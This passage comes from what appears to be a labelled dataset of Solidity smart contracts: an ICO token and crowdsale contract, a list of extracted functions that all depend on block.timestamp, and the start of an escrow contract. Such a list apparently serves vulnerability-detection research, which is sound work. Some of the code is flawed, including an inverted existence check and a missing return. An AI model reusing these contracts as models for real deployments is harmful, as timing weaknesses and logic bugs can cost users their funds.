locked;\n function GigERC20(\n uint256 _totalSupply,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transferAllSupplyToOwner,\n bool _locked\n ) public {\n standard = 'ERC20 0.1';\n locked = _locked;\n totalSupply_ = _totalSupply;\n if (_transferAllSupplyToOwner) {\n balances[msg.sender] = totalSupply_;\n } else {\n balances[this] = totalSupply_;\n }\n name = _tokenName;\n symbol = _tokenSymbol;\n decimals = _decimalUnits;\n creationBlock = block.number;\n }\n function setLocked(bool _locked) public onlyOwner {\n locked = _locked;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(locked == false);\n return super.transfer(_to, _value);\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n if (locked) {\n return false;\n }\n return super.approve(_spender, _value);\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool success) {\n if (locked) {\n return false;\n }\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool success) {\n if (locked) {\n return false;\n }\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (locked) {\n return false;\n }\n return super.transferFrom(_from, _to, _value);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract MintingERC20 is GigERC20 {\n using SafeMath for uint256;\n mapping (address => bool) public minters;\n uint256 public maxSupply;\n modifier onlyMinters () {\n require(true == minters[msg.sender]);\n _;\n }\n function MintingERC20(\n uint256 _initialSupply,\n uint256 _maxSupply,\n string _tokenName,\n uint8 _decimals,\n string _symbol,\n bool _transferAllSupplyToOwner,\n bool _locked\n )\n public GigERC20(_initialSupply, _tokenName, _decimals, _symbol, _transferAllSupplyToOwner, _locked)\n {\n standard = 'MintingERC20 0.1';\n minters[msg.sender] = true;\n maxSupply = _maxSupply;\n }\n function addMinter(address _newMinter) public onlyOwner {\n minters[_newMinter] = true;\n }\n function removeMinter(address _minter) public onlyOwner {\n minters[_minter] = false;\n }\n function mint(address _addr, uint256 _amount) public onlyMinters returns (uint256) {\n if (true == locked) {\n return uint256(0);\n }\n if (_amount == uint256(0)) {\n return uint256(0);\n }\n if (totalSupply_.add(_amount) > maxSupply) {\n return uint256(0);\n }\n totalSupply_ = totalSupply_.add(_amount);\n balances[_addr] = balances[_addr].add(_amount);\n Transfer(address(0), _addr, _amount);\n return _amount;\n }\n}\ncontract GigToken is MintingERC20 {\n SellableToken public crowdSale;\n SellableToken public privateSale;\n bool public transferFrozen = false;\n uint256 public crowdSaleEndTime;\n mapping(address => uint256) public lockedBalancesReleasedAfterOneYear;\n modifier onlyCrowdSale() {\n require(crowdSale != address(0) && msg.sender == address(crowdSale));\n _;\n }\n modifier onlySales() {\n require((privateSale != address(0) && msg.sender == address(privateSale)) ||\n (crowdSale != address(0) && msg.sender == address(crowdSale)));\n _;\n }\n event MaxSupplyBurned(uint256 burnedTokens);\n function GigToken(bool _locked) public\n MintingERC20(0, maxSupply, 'GigBit', 18, 'GBTC', false, _locked)\n {\n standard = 'GBTC 0.1';\n maxSupply = uint256(1000000000).mul(uint256(10) ** decimals);\n }\n function setCrowdSale(address _crowdSale) public onlyOwner {\n require(_crowdSale != address(0));\n crowdSale = SellableToken(_crowdSale);\n crowdSaleEndTime = crowdSale.endTime();\n }\n function setPrivateSale(address _privateSale) public onlyOwner {\n require(_privateSale != address(0));\n privateSale = SellableToken(_privateSale);\n }\n function freezing(bool _transferFrozen) public onlyOwner {\n transferFrozen = _transferFrozen;\n }\n function isTransferAllowed(address _from, uint256 _value) public view returns (bool status) {\n uint256 senderBalance = balanceOf(_from);\n if (transferFrozen == true || senderBalance < _value) {\n return false;\n }\n uint256 lockedBalance = lockedBalancesReleasedAfterOneYear[_from];\n if (lockedBalance > 0 && senderBalance.sub(_value) < lockedBalance) {\n uint256 unlockTime = crowdSaleEndTime + 1 years;\n if (crowdSaleEndTime == 0 || block.timestamp < unlockTime) {\n return false;\n }\n uint256 secsFromUnlock = block.timestamp.sub(unlockTime);\n uint256 months = secsFromUnlock / 30 days;\n if (months > 12) {\n months = 12;\n }\n uint256 tokensPerMonth = lockedBalance / 12;\n uint256 unlockedBalance = tokensPerMonth.mul(months);\n uint256 actualLockedBalance = lockedBalance.sub(unlockedBalance);\n if (senderBalance.sub(_value) < actualLockedBalance) {\n return false;\n }\n }\n if (block.timestamp < crowdSaleEndTime &&\n crowdSale != address(0) &&\n crowdSale.isTransferAllowed(_from, _value) == false\n ) {\n return false;\n }\n return true;\n }\n function transfer(address _to, uint _value) public returns (bool) {\n require(isTransferAllowed(msg.sender, _value));\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) public returns (bool success) {\n require((crowdSaleEndTime <= block.timestamp) && isTransferAllowed(_from, _value));\n return super.transferFrom(_from, _to, _value);\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n require(crowdSaleEndTime <= block.timestamp);\n return super.approve(_spender, _value);\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool success) {\n require(crowdSaleEndTime <= block.timestamp);\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool success) {\n require(crowdSaleEndTime <= block.timestamp);\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n function increaseLockedBalance(address _address, uint256 _tokens) public onlySales {\n lockedBalancesReleasedAfterOneYear[_address] =\n lockedBalancesReleasedAfterOneYear[_address].add(_tokens);\n }\n function burnInvestorTokens(\n address _address,\n uint256 _amount\n ) public onlyCrowdSale returns (uint256) {\n require(block.timestamp > crowdSaleEndTime);\n require(_amount <= balances[_address]);\n balances[_address] = balances[_address].sub(_amount);\n totalSupply_ = totalSupply_.sub(_amount);\n Transfer(_address, address(0), _amount);\n return _amount;\n }\n function burnUnsoldTokens(uint256 _amount) public onlyCrowdSale {\n require(block.timestamp > crowdSaleEndTime);\n maxSupply = maxSupply.sub(_amount);\n MaxSupplyBurned(_amount);\n }\n}\ncontract Multivest is Ownable {\n using SafeMath for uint256;\n mapping (address => bool) public allowedMultivests;\n event MultivestSet(address multivest);\n event MultivestUnset(address multivest);\n event Contribution(address holder, uint256 value, uint256 tokens);\n modifier onlyAllowedMultivests(address _addresss) {\n require(allowedMultivests[_addresss] == true);\n _;\n }\n function Multivest() public {}\n function setAllowedMultivest(address _address) public onlyOwner {\n allowedMultivests[_address] = true;\n MultivestSet(_address);\n }\n function unsetAllowedMultivest(address _address) public onlyOwner {\n allowedMultivests[_address] = false;\n MultivestUnset(_address);\n }\n function multivestBuy(address _address, uint256 _value) public onlyAllowedMultivests(msg.sender) {\n require(buy(_address, _value) == true);\n }\n function multivestBuy(\n address _address,\n uint8 _v,\n bytes32 _r,\n bytes32 _s\n ) public payable onlyAllowedMultivests(verify(keccak256(msg.sender), _v, _r, _s)) {\n require(_address == msg.sender && buy(msg.sender, msg.value) == true);\n }\n function verify(bytes32 _hash, uint8 _v, bytes32 _r, bytes32 _s) internal pure returns (address) {\n bytes memory prefix = '\\x19Ethereum Signed Message:\\n32';\n return ecrecover(keccak256(prefix, _hash), _v, _r, _s);\n }\n function buy(address _address, uint256 _value) internal returns (bool);\n}\ncontract SellableToken is Multivest {\n uint256 public constant MONTH_IN_SEC = 2629743;\n GigToken public token;\n uint256 public minPurchase = 100 * 10 ** 5;\n uint256 public maxPurchase;\n uint256 public softCap;\n uint256 public hardCap;\n uint256 public startTime;\n uint256 public endTime;\n uint256 public maxTokenSupply;\n uint256 public soldTokens;\n uint256 public collectedEthers;\n address public etherHolder;\n uint256 public collectedUSD;\n uint256 public etherPriceInUSD;\n uint256 public priceUpdateAt;\n mapping(address => uint256) public etherBalances;\n Tier[] public tiers;\n struct Tier {\n uint256 discount;\n uint256 startTime;\n uint256 endTime;\n }\n event Refund(address _holder, uint256 _ethers, uint256 _tokens);\n event NewPriceTicker(string _price);\n function SellableToken(\n address _token,\n address _etherHolder,\n uint256 _startTime,\n uint256 _endTime,\n uint256 _maxTokenSupply,\n uint256 _etherPriceInUSD\n )\n public Multivest()\n {\n require(_token != address(0) && _etherHolder != address(0));\n token = GigToken(_token);\n require(_startTime < _endTime);\n etherHolder = _etherHolder;\n require((_maxTokenSupply == uint256(0)) || (_maxTokenSupply <= token.maxSupply()));\n startTime = _startTime;\n endTime = _endTime;\n maxTokenSupply = _maxTokenSupply;\n etherPriceInUSD = _etherPriceInUSD;\n priceUpdateAt = block.timestamp;\n }\n function setTokenContract(address _token) public onlyOwner {\n require(_token != address(0));\n token = GigToken(_token);\n }\n function setEtherHolder(address _etherHolder) public onlyOwner {\n if (_etherHolder != address(0)) {\n etherHolder = _etherHolder;\n }\n }\n function setPurchaseLimits(uint256 _min, uint256 _max) public onlyOwner {\n if (_min < _max) {\n minPurchase = _min;\n maxPurchase = _max;\n }\n }\n function mint(address _address, uint256 _tokenAmount) public onlyOwner returns (uint256) {\n return mintInternal(_address, _tokenAmount);\n }\n function isActive() public view returns (bool);\n function isTransferAllowed(address _from, uint256 _value) public view returns (bool);\n function withinPeriod() public view returns (bool);\n function getMinEthersInvestment() public view returns (uint256) {\n return uint256(1 ether).mul(minPurchase).div(etherPriceInUSD);\n }\n function calculateTokensAmount(uint256 _value) public view returns (uint256 tokenAmount, uint256 usdAmount);\n function calculateEthersAmount(uint256 _tokens) public view returns (uint256 ethers, uint256 bonus);\n function updatePreICOMaxTokenSupply(uint256 _amount) public;\n function setEtherInUSD(string _price) public onlyAllowedMultivests(msg.sender) {\n bytes memory bytePrice = bytes(_price);\n uint256 dot = bytePrice.length.sub(uint256(6));\n require(0x2e == uint(bytePrice[dot]));\n uint256 newPrice = uint256(10 ** 23).div(parseInt(_price, 5));\n require(newPrice > 0);\n etherPriceInUSD = parseInt(_price, 5);\n priceUpdateAt = block.timestamp;\n NewPriceTicker(_price);\n }\n function mintInternal(address _address, uint256 _tokenAmount) internal returns (uint256) {\n uint256 mintedAmount = token.mint(_address, _tokenAmount);\n require(mintedAmount == _tokenAmount);\n soldTokens = soldTokens.add(_tokenAmount);\n if (maxTokenSupply > 0) {\n require(maxTokenSupply >= soldTokens);\n }\n return _tokenAmount;\n }\n function transferEthers() internal;\n function parseInt(string _a, uint _b) internal pure returns (uint) {\n bytes memory bresult = bytes(_a);\n uint res = 0;\n bool decimals = false;\n for (uint i = 0; i < bresult.length; i++) {\n if ((bresult[i] >= 48) && (bresult[i] <= 57)) {\n if (decimals) {\n if (_b == 0) break;\n else _b--;\n }\n res *= 10;\n res += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) res *= 10 ** _b;\n return res;\n }\n}\ncontract CrowdSale is SellableToken {\n uint256 public constant PRE_ICO_TIER_FIRST = 0;\n uint256 public constant PRE_ICO_TIER_LAST = 4;\n uint256 public constant ICO_TIER_FIRST = 5;\n uint256 public constant ICO_TIER_LAST = 8;\n SellableToken public privateSale;\n uint256 public price;\n Stats public preICOStats;\n mapping(address => uint256) public icoBalances;\n struct Stats {\n uint256 soldTokens;\n uint256 maxTokenSupply;\n uint256 collectedUSD;\n uint256 collectedEthers;\n bool burned;\n }\n function CrowdSale(\n address _token,\n address _etherHolder,\n uint256 _maxPreICOTokenSupply,\n uint256 _maxICOTokenSupply,\n uint256 _price,\n uint256[2] _preIcoDuration,\n uint256[2] _icoDuration,\n uint256 _etherPriceInUSD\n ) public\n SellableToken(\n _token,\n _etherHolder,\n _preIcoDuration[0],\n _icoDuration[1],\n _maxPreICOTokenSupply.add(_maxICOTokenSupply),\n _etherPriceInUSD\n ) {\n softCap = 250000000000;\n hardCap = 3578912800000;\n price = _price;\n preICOStats.maxTokenSupply = _maxPreICOTokenSupply;\n tiers.push(\n Tier(\n uint256(65),\n _preIcoDuration[0],\n _preIcoDuration[0].add(1 hours)\n )\n );\n tiers.push(\n Tier(\n uint256(60),\n _preIcoDuration[0].add(1 hours),\n _preIcoDuration[0].add(1 days)\n )\n );\n tiers.push(\n Tier(\n uint256(57),\n _preIcoDuration[0].add(1 days),\n _preIcoDuration[0].add(2 days)\n )\n );\n tiers.push(\n Tier(\n uint256(55),\n _preIcoDuration[0].add(2 days),\n _preIcoDuration[0].add(3 days)\n )\n );\n tiers.push(\n Tier(\n uint256(50),\n _preIcoDuration[0].add(3 days),\n _preIcoDuration[1]\n )\n );\n tiers.push(\n Tier(\n uint256(25),\n _icoDuration[0],\n _icoDuration[0].add(1 weeks)\n )\n );\n tiers.push(\n Tier(\n uint256(15),\n _icoDuration[0].add(1 weeks),\n _icoDuration[0].add(2 weeks)\n )\n );\n tiers.push(\n Tier(\n uint256(10),\n _icoDuration[0].add(2 weeks),\n _icoDuration[0].add(3 weeks)\n )\n );\n tiers.push(\n Tier(\n uint256(5),\n _icoDuration[0].add(3 weeks),\n _icoDuration[1]\n )\n );\n }\n function changeICODates(uint256 _tierId, uint256 _start, uint256 _end) public onlyOwner {\n require(_start != 0 && _start < _end && _tierId < tiers.length);\n Tier storage icoTier = tiers[_tierId];\n icoTier.startTime = _start;\n icoTier.endTime = _end;\n if (_tierId == PRE_ICO_TIER_FIRST) {\n startTime = _start;\n } else if (_tierId == ICO_TIER_LAST) {\n endTime = _end;\n }\n }\n function isActive() public view returns (bool) {\n if (hardCap == collectedUSD.add(preICOStats.collectedUSD)) {\n return false;\n }\n if (soldTokens == maxTokenSupply) {\n return false;\n }\n return withinPeriod();\n }\n function withinPeriod() public view returns (bool) {\n return getActiveTier() != tiers.length;\n }\n function setPrivateSale(address _privateSale) public onlyOwner {\n if (_privateSale != address(0)) {\n privateSale = SellableToken(_privateSale);\n }\n }\n function getActiveTier() public view returns (uint256) {\n for (uint256 i = 0; i < tiers.length; i++) {\n if (block.timestamp >= tiers[i].startTime && block.timestamp <= tiers[i].endTime) {\n return i;\n }\n }\n return uint256(tiers.length);\n }\n function calculateTokensAmount(uint256 _value) public view returns (uint256 tokenAmount, uint256 usdAmount) {\n if (_value == 0) {\n return (0, 0);\n }\n uint256 activeTier = getActiveTier();\n if (activeTier == tiers.length) {\n if (endTime < block.timestamp) {\n return (0, 0);\n }\n if (startTime > block.timestamp) {\n activeTier = PRE_ICO_TIER_FIRST;\n }\n }\n usdAmount = _value.mul(etherPriceInUSD);\n tokenAmount = usdAmount.div(price * (100 - tiers[activeTier].discount) / 100);\n usdAmount = usdAmount.div(uint256(10) ** 18);\n if (usdAmount < minPurchase) {\n return (0, 0);\n }\n }\n function calculateEthersAmount(uint256 _tokens) public view returns (uint256 ethers, uint256 usdAmount) {\n if (_tokens == 0) {\n return (0, 0);\n }\n uint256 activeTier = getActiveTier();\n if (activeTier == tiers.length) {\n if (endTime < block.timestamp) {\n return (0, 0);\n }\n if (startTime > block.timestamp) {\n activeTier = PRE_ICO_TIER_FIRST;\n }\n }\n usdAmount = _tokens.mul((price * (100 - tiers[activeTier].discount) / 100));\n ethers = usdAmount.div(etherPriceInUSD);\n if (ethers < getMinEthersInvestment()) {\n return (0, 0);\n }\n usdAmount = usdAmount.div(uint256(10) ** 18);\n }\n function getStats(uint256 _ethPerBtc) public view returns (\n uint256 sold,\n uint256 maxSupply,\n uint256 min,\n uint256 soft,\n uint256 hard,\n uint256 tokenPrice,\n uint256 tokensPerEth,\n uint256 tokensPerBtc,\n uint256[24] tiersData\n ) {\n sold = soldTokens;\n maxSupply = maxTokenSupply.sub(preICOStats.maxTokenSupply);\n min = minPurchase;\n soft = softCap;\n hard = hardCap;\n tokenPrice = price;\n uint256 usd;\n (tokensPerEth, usd) = calculateTokensAmount(1 ether);\n (tokensPerBtc, usd) = calculateTokensAmount(_ethPerBtc);\n uint256 j = 0;\n for (uint256 i = 0; i < tiers.length; i++) {\n tiersData[j++] = uint256(tiers[i].discount);\n tiersData[j++] = uint256(tiers[i].startTime);\n tiersData[j++] = uint256(tiers[i].endTime);\n }\n }\n function burnUnsoldTokens() public onlyOwner {\n if (block.timestamp >= endTime && maxTokenSupply > soldTokens) {\n token.burnUnsoldTokens(maxTokenSupply.sub(soldTokens));\n maxTokenSupply = soldTokens;\n }\n }\n function isTransferAllowed(address _from, uint256 _value) public view returns (bool status){\n if (collectedUSD.add(preICOStats.collectedUSD) < softCap) {\n if (token.balanceOf(_from) >= icoBalances[_from] && token.balanceOf(_from).sub(icoBalances[_from])> _value) {\n return true;\n }\n return false;\n }\n return true;\n }\n function isRefundPossible() public view returns (bool) {\n if (isActive() || block.timestamp < startTime || collectedUSD.add(preICOStats.collectedUSD) >= softCap) {\n return false;\n }\n return true;\n }\n function refund() public returns (bool) {\n if (!isRefundPossible() || etherBalances[msg.sender] == 0) {\n return false;\n }\n uint256 burnedAmount = token.burnInvestorTokens(msg.sender, icoBalances[msg.sender]);\n if (burnedAmount == 0) {\n return false;\n }\n uint256 etherBalance = etherBalances[msg.sender];\n etherBalances[msg.sender] = 0;\n msg.sender.transfer(etherBalance);\n Refund(msg.sender, etherBalance, burnedAmount);\n return true;\n }\n function updatePreICOMaxTokenSupply(uint256 _amount) public {\n if (msg.sender == address(privateSale)) {\n maxTokenSupply = maxTokenSupply.add(_amount);\n preICOStats.maxTokenSupply = preICOStats.maxTokenSupply.add(_amount);\n }\n }\n function moveUnsoldTokensToICO() public onlyOwner {\n uint256 unsoldTokens = preICOStats.maxTokenSupply - preICOStats.soldTokens;\n if (unsoldTokens > 0) {\n preICOStats.maxTokenSupply = preICOStats.soldTokens;\n }\n }\n function transferEthers() internal {\n if (collectedUSD.add(preICOStats.collectedUSD) >= softCap) {\n etherHolder.transfer(this.balance);\n }\n }\n function mintPreICO(\n address _address,\n uint256 _tokenAmount,\n uint256 _ethAmount,\n uint256 _usdAmount\n ) internal returns (uint256) {\n uint256 mintedAmount = token.mint(_address, _tokenAmount);\n require(mintedAmount == _tokenAmount);\n preICOStats.soldTokens = preICOStats.soldTokens.add(_tokenAmount);\n preICOStats.collectedEthers = preICOStats.collectedEthers.add(_ethAmount);\n preICOStats.collectedUSD = preICOStats.collectedUSD.add(_usdAmount);\n require(preICOStats.maxTokenSupply >= preICOStats.soldTokens);\n require(maxTokenSupply >= preICOStats.soldTokens);\n return _tokenAmount;\n }\n function buy(address _address, uint256 _value) internal returns (bool) {\n if (_value == 0 || _address == address(0)) {\n return false;\n }\n uint256 activeTier = getActiveTier();\n if (activeTier == tiers.length) {\n return false;\n }\n uint256 tokenAmount;\n uint256 usdAmount;\n uint256 mintedAmount;\n (tokenAmount, usdAmount) = calculateTokensAmount(_value);\n require(usdAmount > 0 && tokenAmount > 0);\n if (activeTier >= PRE_ICO_TIER_FIRST && activeTier <= PRE_ICO_TIER_LAST) {\n mintedAmount = mintPreICO(_address, tokenAmount, _value, usdAmount);\n etherHolder.transfer(this.balance);\n } else {\n mintedAmount = mintInternal(_address, tokenAmount);\n require(soldTokens <= maxTokenSupply.sub(preICOStats.maxTokenSupply));\n collectedUSD = collectedUSD.add(usdAmount);\n require(hardCap >= collectedUSD.add(preICOStats.collectedUSD) && usdAmount > 0 && mintedAmount > 0);\n collectedEthers = collectedEthers.add(_value);\n etherBalances[_address] = etherBalances[_address].add(_value);\n icoBalances[_address] = icoBalances[_address].add(tokenAmount);\n transferEthers();\n }\n Contribution(_address, _value, tokenAmount);\n return true;\n }\n}",
  "extract_feature": [
    "function isTransferAllowed(address _from, uint256 _value) public view returns (bool status) {\nuint256 senderBalance = balanceOf(_from);\nif (transferFrozen == true || senderBalance < _value) {\nreturn false;\n}\nuint256 lockedBalance = lockedBalancesReleasedAfterOneYear[_from];\nif (lockedBalance > 0 && senderBalance.sub(_value) < lockedBalance) {\nuint256 unlockTime = crowdSaleEndTime + 1 years;\nif (crowdSaleEndTime == 0 || block.timestamp < unlockTime) {\nreturn false;\n}\nuint256 secsFromUnlock = block.timestamp.sub(unlockTime);\nuint256 months = secsFromUnlock / 30 days;\nif (months > 12) {\nmonths = 12;\n}\nuint256 tokensPerMonth = lockedBalance / 12;\nuint256 unlockedBalance = tokensPerMonth.mul(months);\nuint256 actualLockedBalance = lockedBalance.sub(unlockedBalance);\nif (senderBalance.sub(_value) < actualLockedBalance) {\nreturn false;\n}\n}\nif (block.timestamp < crowdSaleEndTime &&\ncrowdSale != address(0) &&\ncrowdSale.isTransferAllowed(_from, _value) == false\n) {\nreturn false;\n}\nreturn true;\n}",
    "function transferFrom(address _from, address _to, uint _value) public returns (bool success) {\nrequire((crowdSaleEndTime <= block.timestamp) && isTransferAllowed(_from, _value));\nreturn super.transferFrom(_from, _to, _value);\n}",
    "function approve(address _spender, uint256 _value) public returns (bool success) {\nrequire(crowdSaleEndTime <= block.timestamp);\nreturn super.approve(_spender, _value);\n}",
    "function increaseApproval(address _spender, uint _addedValue) public returns (bool success) {\nrequire(crowdSaleEndTime <= block.timestamp);\nreturn super.increaseApproval(_spender, _addedValue);\n}",
    "function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool success) {\nrequire(crowdSaleEndTime <= block.timestamp);\nreturn super.decreaseApproval(_spender, _subtractedValue);\n}",
    "function burnUnsoldTokens(uint256 _amount) public onlyCrowdSale {\nrequire(block.timestamp > crowdSaleEndTime);\nmaxSupply = maxSupply.sub(_amount);\nMaxSupplyBurned(_amount);\n}",
    "function setEtherInUSD(string _price) public onlyAllowedMultivests(msg.sender) {\nbytes memory bytePrice = bytes(_price);\nuint256 dot = bytePrice.length.sub(uint256(6));\nrequire(0x2e == uint(bytePrice[dot]));\nuint256 newPrice = uint256(10 ** 23).div(parseInt(_price, 5));\nrequire(newPrice > 0);\netherPriceInUSD = parseInt(_price, 5);\npriceUpdateAt = block.timestamp;\nNewPriceTicker(_price);\n}",
    "function getActiveTier() public view returns (uint256) {\nfor (uint256 i = 0; i < tiers.length; i++) {\nif (block.timestamp >= tiers[i].startTime && block.timestamp <= tiers[i].endTime) {\nreturn i;\n}\n}\nreturn uint256(tiers.length);\n}",
    "function calculateTokensAmount(uint256 _value) public view returns (uint256 tokenAmount, uint256 usdAmount) {\nif (_value == 0) {\nreturn (0, 0);\n}\nuint256 activeTier = getActiveTier();\nif (activeTier == tiers.length) {\nif (endTime < block.timestamp) {\nreturn (0, 0);\n}\nif (startTime > block.timestamp) {\nactiveTier = PRE_ICO_TIER_FIRST;\n}\n}\nusdAmount = _value.mul(etherPriceInUSD);\ntokenAmount = usdAmount.div(price * (100 - tiers[activeTier].discount) / 100);\nusdAmount = usdAmount.div(uint256(10) ** 18);\nif (usdAmount < minPurchase) {\nreturn (0, 0);\n}\n}",
    "function calculateEthersAmount(uint256 _tokens) public view returns (uint256 ethers, uint256 usdAmount) {\nif (_tokens == 0) {\nreturn (0, 0);\n}\nuint256 activeTier = getActiveTier();\nif (activeTier == tiers.length) {\nif (endTime < block.timestamp) {\nreturn (0, 0);\n}\nif (startTime > block.timestamp) {\nactiveTier = PRE_ICO_TIER_FIRST;\n}\n}\nusdAmount = _tokens.mul((price * (100 - tiers[activeTier].discount) / 100));\nethers = usdAmount.div(etherPriceInUSD);\nif (ethers < getMinEthersInvestment()) {\nreturn (0, 0);\n}\nusdAmount = usdAmount.div(uint256(10) ** 18);\n}",
    "function burnUnsoldTokens() public onlyOwner {\nif (block.timestamp >= endTime && maxTokenSupply > soldTokens) {\ntoken.burnUnsoldTokens(maxTokenSupply.sub(soldTokens));\nmaxTokenSupply = soldTokens;\n}\n}",
    "function isRefundPossible() public view returns (bool) {\nif (isActive() || block.timestamp < startTime || collectedUSD.add(preICOStats.collectedUSD) >= softCap) {\nreturn false;\n}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f53"
  },
  "filename": "8311.sol",
  "content": "pragma solidity ^0.4.23;\ncontract Escrow {\n using SafeMath for uint256;\n using ContentUtils for ContentUtils.ContentMapping;\n ContentUtils.ContentMapping public content;\n address escrowAddr = address(this);\n uint256 public claimable = 0;\n uint256 public currentBalance = 0;\n mapping(bytes32 => uint256) public claimableRewards;\n modifier validReward(uint256 _reward) {\n require(_reward > 0 && _depositEscrow(_reward));\n _;\n }\n function completeDeliverable(bytes32 _id, address _creator, address _brand) internal returns(bool) {\n require(content.isFulfilled(_id, _creator, _brand));\n content.completeDeliverable(_id);\n return _approveEscrow(_id, content.rewardOf(_id));\n }\n function _depositEscrow(uint256 _amount) internal returns(bool) {\n currentBalance = currentBalance.add(_amount);\n return true;\n }\n function _approveEscrow(bytes32 _id, uint256 _amount) internal returns(bool) {\n claimable = claimable.add(_amount);\n claimableRewards[_id] = _amount;\n return true;\n }\n function getClaimableRewards(bytes32 _id) public returns(uint256) {\n return claimableRewards[_id];\n }\n function getContentByName(string _name) public view returns(\n string name,\n string description,\n uint reward,\n uint addedOn)\n {\n var (_content, exist) = content.getContentByName(_name);\n if (exist) {\n return (_content.name, _content.description, _content.deliverable.reward, _content.addedOn);\n } else {\n return (\"\", \"\", 0, 0);\n }\n }\n function currentFulfillment(string _name) public view returns(bool fulfillment) {\n var (_content, exist) = content.getContentByName(_name);\n if (exist) {\n return _content.deliverable.fulfillment[msg.sender];\n } else {\n false;\n }\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary DeliverableUtils {\n struct Deliverable {\n uint256 reward;\n mapping(address=>bool) fulfillment;\n bool fulfilled;\n }\n function fulfill(Deliverable storage self, address _creator, address _brand) internal returns(bool) {\n require(msg.sender == _creator || msg.sender == _brand);\n self.fulfillment[msg.sender] = true;\n return self.fulfillment[_creator] && self.fulfillment[_brand];\n }\n function isFulfilled(Deliverable storage self, address _creator, address _brand) internal view returns(bool) {\n return self.fulfillment[_creator] && self.fulfillment[_brand];\n }\n function newDeliverable(uint256 _reward) internal pure returns(Deliverable _deliverable) {\n require(_reward > 0);\n return Deliverable(_reward, false);\n }\n}\nlibrary ContentUtils {\n using SafeMath for uint256;\n using DeliverableUtils for DeliverableUtils.Deliverable;\n struct Content {\n bytes32 id;\n string name;\n string description;\n uint addedOn;\n DeliverableUtils.Deliverable deliverable;\n }\n struct ContentMapping {\n mapping(bytes32=>Content) data;\n bytes32[] keys;\n bool locked;\n }\n string constant UNIQUE_KEY_ERR = \"Content with ID already exists \";\n string constant KEY_NOT_FOUND_ERR = \"Key not found\";\n function put(ContentMapping storage self,\n string _name,\n string _description,\n uint _reward) public returns (bool)\n {\n require(!self.locked);\n bytes32 _id = generateContentID(_name);\n require(self.data[_id].id == bytes32(0));\n self.data[_id] = Content(_id, _name, _description, block.timestamp, DeliverableUtils.newDeliverable(_reward));\n self.keys.push(_id);\n return true;\n }\n function size(ContentMapping storage self) public view returns (uint) {\n return self.keys.length;\n }\n function rewardOf(ContentMapping storage self, bytes32 _id) public view returns (uint256) {\n return self.data[_id].deliverable.reward;\n }\n function getKey(ContentMapping storage self, uint _index) public view returns (bytes32) {\n isValidIndex(_index, self.keys.length);\n return self.keys[_index];\n }\n function getContentByName(ContentMapping storage self, string _name) public view returns (Content storage _content, bool exists) {\n bytes32 _hash = generateContentID(_name);\n return (self.data[_hash], self.data[_hash].addedOn != 0);\n }\n function getContentByID(ContentMapping storage self, bytes32 _id) public view returns (Content storage _content, bool exists) {\n return (self.data[_id], self.data[_id].id == bytes32(0));\n }\n function getContentByKeyIndex(ContentMapping storage self, uint _index) public view returns (Content storage _content) {\n isValidIndex(_index, self.keys.length);\n return (self.data[self.keys[_index]]);\n }\n function fulfill(ContentMapping storage self, bytes32 _id, address _creator, address _brand) public returns(bool) {\n return self.data[_id].deliverable.fulfill(_creator, _brand);\n }\n function isFulfilled(ContentMapping storage self, bytes32 _id, address _creator, address _brand) public view returns(bool) {\n return self.data[_id].deliverable.isFulfilled(_creator, _brand);\n }\n function completeDeliverable(ContentMapping storage self, bytes32 _id) internal returns(bool) {\n self.data[_id].deliverable.fulfilled = true;\n return true;\n }\n function generateContentID(string _name) public pure returns (bytes32) {\n return keccak256(_name);\n }\n function isValidIndex(uint _index, uint _size) public pure {\n require(_index < _size, KEY_NOT_FOUND_ERR);\n }\n}\ncontract Agreement is Escrow {\n bool public locked;\n uint public createdOn;\n uint public expiration;\n uint public startTime;\n address public brand;\n address public creator;\n constructor(address _creator, uint _expiration, address _token) public {\n brand = msg.sender;\n creator = _creator;\n expiration = _expiration;\n }\n modifier onlyBrand() {\n require(msg.sender == brand);\n _;\n }\n modifier onlyCreator() {\n require(msg.sender == creator);\n _;\n }\n modifier fulfilled(bytes32 _id) {\n require(content.isFulfilled(_id, creator, brand));\n _;\n }\n modifier expired() {\n require(block.timestamp > expiration);\n _;\n }\n modifier notExpired() {\n require(block.timestamp < expiration);\n _;\n }\n modifier notLocked() {\n require(!locked);\n _;\n }\n function addContent(string _name,\n string _description,\n uint _reward) notLocked onlyBrand validReward(_reward)\n public returns(bool _success) {\n return content.put(_name, _description, _reward);\n }\n function _fulfill(bytes32 _id) private returns (bool) {\n bool _fulfilled = content.fulfill(_id, creator, brand);\n if(_fulfilled) 